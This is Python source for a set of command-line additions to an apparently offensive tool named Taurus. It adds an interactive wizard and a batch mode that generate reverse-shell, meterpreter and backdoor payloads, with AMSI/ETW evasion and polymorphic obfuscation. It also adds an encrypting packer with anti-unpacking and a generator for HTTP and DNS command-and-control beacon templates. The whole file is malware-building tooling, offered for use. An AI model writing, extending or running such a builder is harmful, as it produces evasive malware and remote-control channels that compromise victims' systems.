"""
Additional CLI commands for Taurus
These should be added to cli.py before the main block
"""


@cli.command()
def interactive():
    """Interactive payload generation wizard"""
    console.print(Panel.fit(
        "[bold cyan]Interactive Payload Generator[/bold cyan]\\n"
        "[dim]Follow the prompts to create your payload[/dim]",
        border_style="cyan"
    ))
    
    try:
        # Payload type selection
        console.print("\\n[bold]Step 1: Select Payload Type[/bold]")
        payload_types = ["reverse_shell", "meterpreter", "backdoor"]
        for i, ptype in enumerate(payload_types, 1):
            console.print(f"  {i}. {ptype}")
        
        choice = Prompt.ask("Select payload type", choices=["1", "2", "3"], default="1")
        payload_type = payload_types[int(choice) - 1]
        
        # Target OS
        console.print("\\n[bold]Step 2: Select Target OS[/bold]")
        target_os = Prompt.ask("Target OS", choices=["windows", "linux", "android"], default="windows")
        
        # Architecture
        arch = Prompt.ask("Architecture", choices=["x86", "x64"], default="x64")
        
        # Network settings
        console.print("\\n[bold]Step 3: Network Configuration[/bold]")
        lhost = Prompt.ask("Listener host (LHOST)")
        lport = Prompt.ask("Listener port (LPORT)", default="4444")
        
        # Obfuscation
        console.print("\\n[bold]Step 4: Obfuscation Settings[/bold]")
        obfuscate = Confirm.ask("Apply obfuscation?", default=True)
        obf_level = 3
        if obfuscate:
            obf_level = int(Prompt.ask("Obfuscation level (1-5)", default="3"))
        
        # ML mode
        ml_mode = Confirm.ask("Use ML-based obfuscation?", default=False)
        
        # Evasion techniques
        console.print("\\n[bold]Step 5: Evasion Techniques[/bold]")
        use_evasion = Confirm.ask("Apply evasion techniques (AMSI, ETW, etc.)?", default=True)
        
        # Output
        console.print("\\n[bold]Step 6: Output Configuration[/bold]")
        output = Prompt.ask("Output filename", default=f"{payload_type}.exe")
        
        # Summary
        console.print("\\n[bold cyan]Configuration Summary:[/bold cyan]")
        table = Table(show_header=False, box=None)
        table.add_row("Payload Type:", payload_type)
        table.add_row("Target:", f"{target_os}/{arch}")
        table.add_row("Network:", f"{lhost}:{lport}")
        table.add_row("Obfuscation:", f"Level {obf_level}" if obfuscate else "Disabled")
        table.add_row("ML Mode:", "Enabled" if ml_mode else "Disabled")
        table.add_row("Evasion:", "Enabled" if use_evasion else "Disabled")
        table.add_row("Output:", output)
        console.print(table)
        
        if not Confirm.ask("\\nProceed with generation?", default=True):
            console.print("[yellow]Generation cancelled[/yellow]")
            return
        
        # Generate payload
        console.print("\\n[bold green]Generating payload...[/bold green]")
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            console=console,
        ) as progress:
            task = progress.add_task("[cyan]Generating...", total=100)
            
            # Get factory
            factory = get_payload_factory()
            progress.update(task, advance=20)
            
            # Generate base payload
            if payload_type == "reverse_shell":
                payload, metadata = factory.generate_reverse_shell_tcp(
                    lhost=lhost,
                    lport=int(lport),
                    target_os=target_os,
                    architecture=arch,
                )
            elif payload_type == "meterpreter":
                payload, metadata = factory.generate_meterpreter_payload(
                    lhost=lhost,
                    lport=int(lport),
                    target_os=target_os,
                    architecture=arch,
                )
            elif payload_type == "backdoor":
                payload, metadata = factory.generate_backdoor(
                    lhost=lhost,
                    lport=int(lport),
                    target_os=target_os,
                )
            
            progress.update(task, advance=30)
            
            # Apply evasion
            if use_evasion:
                evasion = get_evasion_orchestrator()
                payload, evasion_meta = evasion.apply_all_evasions(payload)
                metadata["evasion"] = evasion_meta
            
            progress.update(task, advance=20)
            
            # Apply obfuscation
            if obfuscate:
                obfuscator = get_obfuscator()
                payload, obf_metadata = obfuscator.obfuscate_payload(
                    payload,
                    level=obf_level,
                )
                metadata["obfuscation"] = obf_metadata
            
            progress.update(task, advance=20)
            
            # Save
            output_path = factory.save_payload(payload, output, metadata)
            progress.update(task, advance=10)
        
        console.print(f"\\n[bold green]✓ Payload generated successfully![/bold green]")
        console.print(f"Output: [cyan]{output_path}[/cyan]")
        console.print(f"Size: {len(payload)} bytes")
        
    except Exception as e:
        console.print(f"[bold red]Error: {e}[/bold red]")
        raise click.ClickException(str(e))


@cli.command()
@click.option("--type", "-t", "payload_type", required=True)
@click.option("--target", default="windows")
@click.option("--lhost", required=True)
@click.option("--lport", type=int, required=True)
@click.option("--count", "-n", type=int, default=5, help="Number of variants to generate")
@click.option("--output-dir", "-o", default="batch_output", help="Output directory")
def batch(payload_type, target, lhost, lport, count, output_dir):
    """Generate multiple payload variants"""
    
    console.print(f"[bold]Generating {count} variants of {payload_type}...[/bold]\\n")
    
    try:
        import os
        os.makedirs(output_dir, exist_ok=True)
        
        factory = get_payload_factory()
        obfuscator = get_obfuscator()
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console,
        ) as progress:
            task = progress.add_task("[cyan]Generating variants...", total=count)
            
            for i in range(count):
                # Generate base payload
                if payload_type == "reverse_shell":
                    payload, metadata = factory.generate_reverse_shell_tcp(
                        lhost=lhost,
                        lport=lport,
                        target_os=target,
                    )
                else:
                    console.print(f"[yellow]Unsupported type for batch: {payload_type}[/yellow]")
                    return
                
                # Apply polymorphic obfuscation
                variants = obfuscator.apply_polymorphic_obfuscation(payload, num_variants=1)
                variant_payload, variant_meta = variants[0]
                
                # Save
                output_file = f"{output_dir}/{payload_type}_variant_{i+1}.bin"
                factory.save_payload(variant_payload, output_file, metadata)
                
                progress.update(task, advance=1)
        
        console.print(f"\\n[bold green]✓ Generated {count} variants in {output_dir}/[/bold green]")
        
    except Exception as e:
        console.print(f"[bold red]Error: {e}[/bold red]")
        raise click.ClickException(str(e))


@cli.command()
@click.option("--payload", "-p", required=True, type=click.Path(exists=True))
@click.option("--compression", type=click.Choice(["zlib", "lzma", "custom"]), default="zlib")
@click.option("--encryption", type=click.Choice(["aes", "chacha20", "xor"]), default="aes")
@click.option("--output", "-o", required=True)
def pack(payload, compression, encryption, output):
    """Pack and encrypt a payload"""
    
    console.print(f"[bold]Packing payload: {payload}[/bold]\\n")
    
    try:
        # Read payload
        with open(payload, 'rb') as f:
            payload_bytes = f.read()
        
        console.print(f"Original size: {len(payload_bytes)} bytes")
        
        # Pack
        packer = get_packer()
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=console,
        ) as progress:
            progress.add_task("[cyan]Packing payload...", total=None)
            
            packed, metadata = packer.pack_payload(
                payload_bytes,
                compression=compression,
                encryption=encryption,
                anti_unpack=True,
            )
        
        # Save
        with open(output, 'wb') as f:
            f.write(packed)
        
        # Save metadata
        import json
        with open(output + '.meta.json', 'w') as f:
            json.dump(metadata, f, indent=2)
        
        console.print(f"\\n[bold green]✓ Payload packed successfully![/bold green]")
        console.print(f"Packed size: {len(packed)} bytes")
        console.print(f"Compression ratio: {metadata['compression_ratio']:.2%}")
        console.print(f"Output: [cyan]{output}[/cyan]")
        
    except Exception as e:
        console.print(f"[bold red]Error: {e}[/bold red]")
        raise click.ClickException(str(e))


@cli.command()
@click.option("--type", "-t", type=click.Choice(["http", "dns", "custom"]), required=True)
@click.option("--server", required=True, help="C2 server address")
@click.option("--port", type=int, default=443)
@click.option("--output", "-o", required=True)
def c2(type, server, port, output):
    """Generate C2 communication template"""
    
    console.print(f"[bold]Generating {type.upper()} C2 template...[/bold]\\n")
    
    try:
        factory = get_c2_factory()
        
        if type == "http":
            template = factory.create_http_beacon(server, port, use_https=True)
            beacon_code = template.generate_beacon_code()
            handler_code = template.generate_command_handler()
        elif type == "dns":
            template = factory.create_dns_tunnel(server)
            beacon_code = template.generate_beacon_code()
            handler_code = template.generate_command_handler()
        elif type == "custom":
            template = factory.create_custom_protocol(server, port)
            beacon_code = template.generate_beacon_code()
            handler_code = template.generate_command_handler()
        
        # Get encryption functions
        crypto_functions = factory.generate_encryption_functions()
        
        # Combine
        full_template = crypto_functions + b"\\n\\n" + beacon_code + b"\\n\\n" + handler_code
        
        # Save
        with open(output, 'wb') as f:
            f.write(full_template)
        
        console.print(f"[bold green]✓ C2 template generated![/bold green]")
        console.print(f"Type: {type.upper()}")
        console.print(f"Server: {server}:{port}")
        console.print(f"Output: [cyan]{output}[/cyan]")
        console.print(f"\\n[yellow]Remember to customize encryption keys and parameters![/yellow]")
        
    except Exception as e:
        console.print(f"[bold red]Error: {e}[/bold red]")
        raise click.ClickException(str(e))


# Add these commands to cli.py before the main block
